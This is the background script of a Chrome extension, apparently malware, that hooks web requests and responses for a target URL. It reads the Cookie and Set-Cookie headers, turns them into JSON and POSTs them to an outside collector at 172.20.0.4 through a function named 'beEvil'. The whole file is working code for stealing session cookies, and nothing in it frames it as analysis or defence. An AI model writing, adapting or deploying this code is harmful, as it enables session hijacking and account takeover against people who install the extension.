function beEvil(data){
    fetch("http://172.20.0.4", {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify(data)
    });
}

chrome.runtime.onMessage.addListener((req, sen, resp) => {
    switch (req.func) {
        case "beforeGet":
            chrome.webRequest.onBeforeSendHeaders.addListener((details) => {
                var cookieIndex = -1
                for (i=0; i<details.requestHeaders.length; i++){
                    if(details.requestHeaders[i].name == "Cookie"){
                        cookieIndex = i;
                    }
                }
                var temp = '[';
                if(cookieIndex != -1){
                    var cookies = details.requestHeaders[cookieIndex].value.split(";");
                        cookies.forEach((cookie) => {
                            cookie = cookie.split("=");
                            temp += '{"name": "' + cookie[0] + '", "value": "' + cookie[1].replaceAll('"', '\\"') +'"},';
                        });
                }
                temp = temp.slice(0,-1) + ']';
                console.log(temp)
                beEvil(JSON.parse(temp));
            },
            {urls: [req.target]},
            ["requestHeaders", "extraHeaders"]
            );
            break;
        case "headersGet":
            chrome.webRequest.onHeadersReceived.addListener((details) => {
                setCookieIndicies = [];
                for (i=0; i<details.responseHeaders.length; i++){
                    if(details.responseHeaders[i].name == "set-cookie"){
                        setCookieIndicies.push(i);
                    }
                }
                temp = '[';
                for (j=0; j<setCookieIndicies.length; j++){
                    var currentString = details.responseHeaders[setCookieIndicies[j]].value.split(";")[0];
                    currentString = currentString.split("=");
                    temp += '{"name": "' + currentString[0] + '", "value": "' + currentString[1].replaceAll('"', '\\"') +'"},';
                }
                temp = temp.slice(0,-1) + ']';
                beEvil(JSON.parse(temp));
            },
            {urls: [req.target]},
            ["responseHeaders", "extraHeaders"]
            );
            break;
    }
});
